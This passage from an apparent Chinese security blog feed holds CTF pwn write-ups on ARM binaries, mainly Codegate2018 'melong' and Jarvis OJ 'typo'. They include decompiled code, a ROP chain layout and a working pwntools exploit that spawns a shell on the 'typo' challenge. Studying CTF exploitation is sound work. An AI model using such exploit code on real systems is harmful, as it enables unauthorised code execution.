punctuation">[</span>b<span class="token punctuation">]</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'finalbin.txt'</span><span class="token punctuation">,</span><span class="token string">'w+'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> ff<span class="token punctuation">:</span>        ff<span class="token punctuation">.</span>write<span class="token punctuation">(</span>finalbin<span class="token punctuation">)</span></code></pre><p><img src="https://i.loli.net/2018/10/12/5bc07be42ac0e.png" alt=""></p><blockquote><p>接下来利用python的libnum库，将二进制转换为字符串得到第一个flag：</p></blockquote><p>  <img src="https://i.loli.net/2018/10/12/5bc0611d2a07a.png" alt=""></p><blockquote><p>用binwalk分析一下内容，发现里面有一个压缩包，进行提取得到以下文件：一个flag elf程序 ，passkey.txt，简单看一下，接下来的第二题应该是逆向了。。待更新。。。</p><p><img src="https://i.loli.net/2018/10/12/5bc061b548e19.png" alt=""></p></blockquote><p>先到这 。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;中科大-Hackergame2018-write-up&quot;&gt;&lt;a href=&quot;#中科大-Hackergame2018-write-up&quot; class=&quot;headerlink&quot; title=&quot;中科大-Hackergame2018 write-
      
    
    </summary>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/tags/CTF/"/>
    
      <category term="writeup" scheme="http://www.yof3ng.xyz/tags/writeup/"/>
    
      <category term="ustc" scheme="http://www.yof3ng.xyz/tags/ustc/"/>
    
  </entry>
  
  <entry>
    <title>Pwn-10月16-Codegate2018-melong</title>
    <link href="http://www.yof3ng.xyz/2018/10/16/Pwn-10%E6%9C%8816-Codegate2018-melong/"/>
    <id>http://www.yof3ng.xyz/2018/10/16/Pwn-10月16-Codegate2018-melong/</id>
    <published>2018-10-16T03:13:17.000Z</published>
    <updated>2018-10-17T06:27:44.971Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="Pwn-10月16-Codegate2018-melong"><a href="#Pwn-10月16-Codegate2018-melong" class="headerlink" title="Pwn-10月16-Codegate2018-melong"></a>Pwn-10月16-Codegate2018-melong</h1><blockquote><p>同样借助<a href="https://m4x.fun/post/how-2-pwn-an-arm-binary/" target="_blank" rel="noopener">m4x大佬</a>的博客来看一看这一题是一个怎么样的解题思路。</p><p>根据大佬原话<code>漏洞很好找, write_diary 中 read 的长度是由我们输入的, 可以栈溢出, 先进入 PT 函数, 输入 -1, 再进入 write_diary, 就可以实现 arbitrary overflow 了, 因此思路同 x64 下的 rop 相同, 先 leak 出 libc 基址, 然后控制执行 system(“/bin/sh”) 即可</code>，我们来进行分析：</p></blockquote><h2 id="一-查看保护措施"><a href="#一-查看保护措施" class="headerlink" title="一.查看保护措施"></a>一.查看保护措施</h2><blockquote><p>先看一下程序的基本信息咯：</p><p><img src="https://i.loli.net/2018/10/16/5bc55a518786c.png" alt=""></p><p>可以知道这个是个32位arm架构的程序，并且需要动态链接共享库来运行。看一下它的保护措施：</p><p>​    <img src="https://i.loli.net/2018/10/16/5bc55b1e51a4f.png" alt=""></p><p>可以看到并没有开启栈溢出保护，以及nx，pie等保护措施。</p></blockquote><h2 id="二-静态分析程序逻辑"><a href="#二-静态分析程序逻辑" class="headerlink" title="二.静态分析程序逻辑"></a>二.静态分析程序逻辑</h2><blockquote><p>先下载一下缺少的动态共享库：</p><p><code>sudo apt-get install libc6-armel-cross</code></p><p>这样可以解决缺少<code>/lib/ld-linux.so.3</code>的问题，然后简单运行一下看看：</p><p><img src="https://i.loli.net/2018/10/16/5bc5eaee90791.png" alt=""></p><p>可以看到height输入的地方可能存在溢出，接下来ida看一看程序逻辑：</p><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// r0</span>  <span class="token keyword">char</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+0h] [bp-54h]</span>  <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+34h] [bp-20h]</span>  <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+38h] [bp-1Ch]</span>  size_t v8<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+40h] [bp-14h]</span>  <span class="token keyword">int</span> v9<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+4Ch] [bp-8h]</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token punctuation">(</span>FILE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token punctuation">(</span>FILE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token punctuation">(</span>FILE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v8 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  v6 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Welcome to the BPSEC gym\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"1. Check your bmi"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"2. Exercise"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"3. Register personal training"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"4. Write daily record"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"5. Have some health menu"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"6. Out of the gym\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Type the number:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    v3 <span class="token operator">=</span> <span class="token function">_isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v9<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span> v9 <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span>        <span class="token function">check</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v6<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">continue</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">2</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token punctuation">)</span>          <span class="token function">exercise</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v6<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">else</span>          <span class="token function">check_first</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">continue</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">3</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token punctuation">)</span>          v8 <span class="token operator">=</span> <span class="token function">PT</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">else</span>          <span class="token function">check_first</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">continue</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">4</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v8 <span class="token punctuation">)</span>          <span class="token function">write_diary</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v8<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">else</span>          <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"you should take personal training first!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">continue</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">5</span><span class="token punctuation">:</span>        <span class="token function">diet_menu</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v8<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">goto</span> LABEL_14<span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">6</span><span class="token punctuation">:</span>LABEL_14<span class="token punctuation">:</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"See you again :)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">default</span><span class="token punctuation">:</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Invalid number :("</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>进入case3的PT函数可以看到一个判断：</p><pre class=" language-c"><code class="language-c">size_t <span class="token function">PT</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  size_t v0<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// r3</span>  size_t size<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+4h] [bp-10h]</span>  <span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+8h] [bp-Ch]</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+Ch] [bp-8h]</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Let's start personal training"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"How long do you want to take personal training?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">_isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//ptr 将会申请一个size大小的内存空间，如果我们输入-1给size，那么malloc会申请失败导致ptr为null</span>  ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> ptr <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>exc2 <span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//ptr == NULL 判断成立可以进入case4</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Okay, start to exercise!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span>size<span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"you are getting healthy.."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>    v0 <span class="token operator">=</span> size<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Check your bmi again!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>    v0 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> v0<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>之前记的那个看起来像是突破点的地方其实并不是，真正的溢出点在case4：</p><pre class=" language-c"><code class="language-c">_DWORD <span class="token operator">*</span>__fastcall <span class="token function">write_diary</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span>result<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>a2<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">void</span> <span class="token operator">*</span>buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+0h] [bp-14h]</span>  <span class="token keyword">unsigned</span> __int8 nbytes<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+Fh] [bp-5h]</span>  buf <span class="token operator">=</span> a2<span class="token punctuation">;</span>  nbytes <span class="token operator">=</span> <span class="token operator">*</span>result<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> nbytes <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> a2<span class="token punctuation">,</span> nbytes<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//溢出点啦</span>    result <span class="token operator">=</span> <span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"you wrote %s\n"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>然后呢，从这里就到了开始疯狂的补姿势的时候了。因为这题和上题类似，需要我们找到system函数的地址才行呢，给自己挖了个大坑，以后再来填吧。</p></blockquote><h3 id="system地址泄露-amp-amp-leak-libc"><a href="#system地址泄露-amp-amp-leak-libc" class="headerlink" title="system地址泄露&amp;&amp;leak libc"></a>system地址泄露&amp;&amp;leak libc</h3><p><a href="http://www.freebuf.com/articles/rookie/155971.html" target="_blank" rel="noopener">参考文章1</a></p><p><a href="https://www.cnblogs.com/HacTF/p/8052175.html" target="_blank" rel="noopener">参考文章2</a></p><blockquote><p> 【1】利用格式化字符串漏洞泄露栈中的数据，从而找到libc的某个函数地址，再利用libc-database来判断远程libc的版本，之后再计算出libc的基址。</p><p>【2】利用write这个函数，pwntools有个很好用的函数DynELF去利用这个函数计算出程序的各种地址，包括函数的基地址，libc的基地址，libc中system的地址。</p><p>【3】利用printf函数，printf函数输出的时候遇到0x00时候会停止输出，如果输入的时候没有在最后的字节处填充0x00，那么输出的时候就可能泄露栈中的重要数据，比如libc的某个函数地址。</p></blockquote><blockquote><p><strong>关于PLT（进程链接表）和GOT（Global Offset Table-全局偏移表）</strong>：为了灵活利用虚拟内存空间，所以编译器可以产生位置无关的代码。可执行文件可以是位置无关的，也可以是位置相关的， 动态链接库绝大多数都是位置无关的。 GOT表可写不可执行， PLT可执行不可写。他们相互作用来实现函数符号的延时绑定.。ASLR并不随机化PLT部分，所以对ret2plt攻击没有直接影响。 为防止恶意修改got， 链接器提供了RELRO选项,，去除got的写权限， 但也牺牲了延时绑定带来的好处。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;Pwn-10月16-Codegate2018-melong&quot;&gt;&lt;a href=&quot;#Pwn-10月16-Codegate2018-melong&quot; class=&quot;headerlink&quot; title=&quot;Pwn-10月16-Codegate201
      
    
    </summary>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/categories/CTF/"/>
    
    
      <category term="Pwn" scheme="http://www.yof3ng.xyz/tags/Pwn/"/>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/tags/CTF/"/>
    
      <category term="二进制安全" scheme="http://www.yof3ng.xyz/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Pwn-10月15-qemu</title>
    <link href="http://www.yof3ng.xyz/2018/10/15/Pwn-10%E6%9C%8815-qemu/"/>
    <id>http://www.yof3ng.xyz/2018/10/15/Pwn-10月15-qemu/</id>
    <published>2018-10-15T06:26:10.000Z</published>
    <updated>2018-10-15T08:59:05.761Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="Pwn-10月15-简单了解异构pwn题"><a href="#Pwn-10月15-简单了解异构pwn题" class="headerlink" title="Pwn-10月15-简单了解异构pwn题"></a>Pwn-10月15-简单了解异构pwn题</h1><blockquote><p>&nbsp; &nbsp; &nbsp; &nbsp; 参照m4x大佬的博客简单地搭建了一下环境后，继续来练练手，简单了解一下异构binary调试，如arm，mips，环境搭建参照上一篇。</p><p><img src="https://courses.washington.edu/cp105/_images/ARM_Calling_Convention.png" alt=""></p><p>arm 的参数 1 ~ 4 分别保存到 r0 ~ r3 寄存器中, 剩下的参数从右向左依次入栈, 被调用者实现栈平衡, 返回值存放在 r0 中 。arm 的 pc 指针相当于 eip/rip, b/bl 等指令实现了跳转 </p></blockquote><h2 id="Jarvis-oj-typo"><a href="#Jarvis-oj-typo" class="headerlink" title="Jarvis oj - typo"></a>Jarvis oj - typo</h2><blockquote><p>简单说一下步骤：先查看保护措施，可以发现没有栈溢出保护，运行程序有溢出点可以利用，然后可以找到溢出点位置，找到system函数，以及/bin/sh字符串的位置，然后拿到能够控制 r0寄存器</p></blockquote><h3 id="一-查看保护措施"><a href="#一-查看保护措施" class="headerlink" title="一. 查看保护措施"></a>一. 查看保护措施</h3><blockquote><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#checksec typo</span>    Arch:     arm-32-little    <span class="token comment" spellcheck="true">#32位小端序 arm架构程序</span>    RELRO:    Partial RELRO    Stack:    No canary found    <span class="token comment" spellcheck="true">#无栈溢出保护</span>    NX:       NX enabled            PIE:      No PIE <span class="token punctuation">(</span>0x8000<span class="token punctuation">)</span></code></pre><blockquote><p>顺便学习一下几种防护措施的意思：</p><p> 参考链接：<a href="https://www.jianshu.com/p/6e528b33e37a" target="_blank" rel="noopener">https://www.jianshu.com/p/6e528b33e37a</a></p><p> ​    <strong>RELRO</strong>:在Linux系统安全领域数据可以写的存储区就会是攻击的目标，尤其是存储函数指针的区域，尽量减少可写的存储区域可使安全系数提高。GCC, GNU linker以及Glibc-dynamic linker一起配合实现了一种叫做relro的技术Relocation Read Only, 重定向只读，实现就是由linker指定binary的一块经过dynamic linker处理过 relocation之后的区域为只读。</p><p> ​    栈溢出检查，用<strong>Canary金丝雀值</strong>是否变化来检测,Canary found表示开启。金丝雀最早指的是矿工曾利用金丝雀来确认是否有气体泄漏，如果金丝雀因为气体泄漏而中毒死亡，可以给矿工预警。这里是一种缓冲区溢出攻击缓解手段：启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux将cookie信息称为Canary。</p><p> <strong> NX </strong> : No Execute，栈不可执行，也就是windows上的DEP。 分析缓冲区溢出攻击，其根源在于现代计算机对数据和代码没有明确区分这一先天缺陷，就目前来看重新去设计计算机体系结构基本上是不可能的，我们只能靠向前兼容的修补来减少溢出带来的损害，DEP就是用来弥补计算机对数据和代码混淆这一天然缺陷的。 </p><p> <strong>PIE</strong>: position-independent executables, 位置无关的可执行文件，也就是常说的ASLR(Address space layout randomization) 地址随机化，程序每次启动基址都随机。 </p></blockquote></blockquote><h3 id="二-分析程序"><a href="#二-分析程序" class="headerlink" title="二. 分析程序"></a>二. 分析程序</h3><blockquote><p>开始远程调试：</p><p><img src="https://i.loli.net/2018/10/15/5bc4403f1bdbb.png" alt=""></p><p>另一边使用 <code>gdb-multiarch typo -q</code>进入pwndbg，并且使用<code>target remote localhost:6788</code>连接程序：</p><p><img src="https://i.loli.net/2018/10/15/5bc4437a3ebb6.png" alt=""></p><p>生成padding，输入后得到溢出信息</p><pre class=" language-bash"><code class="language-bash">pwndbg<span class="token operator">></span> cyclic 200aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab</code></pre><p><img src="https://i.loli.net/2018/10/15/5bc4443368612.png" alt=""></p></blockquote><h3 id="三-确定溢出点"><a href="#三-确定溢出点" class="headerlink" title="三.确定溢出点"></a>三.确定溢出点</h3><blockquote><p>之前已经说过PC相当于EIP,RIP之类的指向下一条指令的寄存器，那么可以计算padding到PC寄存器的偏移量进而确定溢出点为0x62616165：</p><p>使用pwndbg的<code>cyclic -l</code>命令可以通过地址，字符串确定偏移量.</p><p><img src="https://i.loli.net/2018/10/15/5bc445613c9bc.png" alt=""></p></blockquote><h3 id="四-构造payload进行利用"><a href="#四-构造payload进行利用" class="headerlink" title="四.构造payload进行利用"></a>四.构造payload进行利用</h3><blockquote><p> 默默标记M4x博文中的这句话<code>因为是静态链接, 所以 binary 中一定会有 system 函数 和 /bin/sh 字符串, 如果能找到溢出点, 很容易就能用 rop 来解决了</code>，学习一波姿势，构造<code>rop chain</code>，通过ROPgadget可以找到我们需要的：可以用来传递 返回值的寄存器 r0</p><p><img src="https://i.loli.net/2018/10/15/5bc4465b7fefb.png" alt=""></p><p>那么接下来就是寻找system函数的地址，将其填入PC寄存器的位置，从而执行<code>system(&#39;/bin/sh&#39;)</code></p><p>IDA调试一波：</p><p>通过字符串查找或者交叉引用可以发现函数<code>sub_10BA8</code></p><p><img src="https://i.loli.net/2018/10/15/5bc44948ebb68.png" alt=""></p><p>不知道是不是ida7.0的原因，这里直接找到了system函数：</p><p><img src="https://i.loli.net/2018/10/15/5bc44a0873387.png" alt=""></p><p>可以看到其执行命令的逻辑和地址：</p><p><img src="https://i.loli.net/2018/10/15/5bc44d1ac5d50.png" alt=""></p><p>接下来可以开始构造payload结构：</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">|</span>    padding            <span class="token operator">|</span>    <span class="token operator">&lt;&lt;</span> 112*<span class="token string">'a'</span><span class="token operator">|</span>    pop <span class="token punctuation">{</span>r0,r4,pc<span class="token punctuation">}</span>    <span class="token operator">|</span>    <span class="token operator">&lt;&lt;</span> p32<span class="token punctuation">(</span>0x20904<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#gadget_addr</span><span class="token operator">|</span>    /bin/sh            <span class="token operator">|</span>    <span class="token operator">&lt;&lt;</span> p32<span class="token punctuation">(</span>0x6c384<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#/bin/sh_addr</span><span class="token operator">|</span>    junk_data<span class="token punctuation">(</span>r4<span class="token punctuation">)</span>    <span class="token operator">|</span>    <span class="token operator">&lt;&lt;</span> p32<span class="token punctuation">(</span><span class="token string">"anything"</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#r4填充</span><span class="token operator">|</span>    system_addr<span class="token punctuation">(</span>pc<span class="token punctuation">)</span>    <span class="token operator">|</span>    <span class="token operator">&lt;&lt;</span> p32<span class="token punctuation">(</span>0x110b4<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#system函数地址</span></code></pre><p><strong>溢出导致PC指向gadget_addr，然后执行命令pop出栈将”/bin/sh”赋值到r0寄存器，junk_data赋值到r4寄存器，system_addr赋值到PC寄存器。</strong></p></blockquote><h3 id="五-攻破"><a href="#五-攻破" class="headerlink" title="五.攻破"></a>五.攻破</h3><blockquote><p>写出exp:    </p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span>__Auther__ <span class="token operator">=</span> <span class="token string">"Yof3ng"</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./typo"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"quit\n"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">112</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x20904</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x6c384</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x110b4</span><span class="token punctuation">)</span><span class="token keyword">try</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"echo xiaoyifeng"</span><span class="token punctuation">)</span><span class="token keyword">except</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Error!"</span><span class="token punctuation">)</span>    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">if</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"xiaoyifeng"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"getshell"</span><span class="token punctuation">)</span></code></pre><p><img src="https://i.loli.net/2018/10/15/5bc4518d2ce65.png" alt=""></p></blockquote><blockquote><p>PWN真好玩！😭😭</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;Pwn-10月15-简单了解异构pwn题&quot;&gt;&lt;a href=&quot;#Pwn-10月15-简单了解异构pwn题&quot; class=&quot;headerlink&quot; title=&quot;Pwn-10月15-简单了解异构pwn题&quot;&gt;&lt;/a&gt;Pwn-10月15-简单了
      
    
    </summary>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/categories/CTF/"/>
    
    
      <category term="Pwn" scheme="http://www.yof3ng.xyz/tags/Pwn/"/>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/tags/CTF/"/>
    
      <category term="二进制安全" scheme="http://www.yof3ng.xyz/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Linux环境配置</title>
    <link href="http://www.yof3ng.xyz/2018/10/14/Linux%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
    <id>http://www.yof3ng.xyz/2018/10/14/Linux环境配置/</id>
    <published>2018-10-14T13:24:38.000Z</published>
    <updated>2018-10-15T01:18:15.162Z</updated>
    
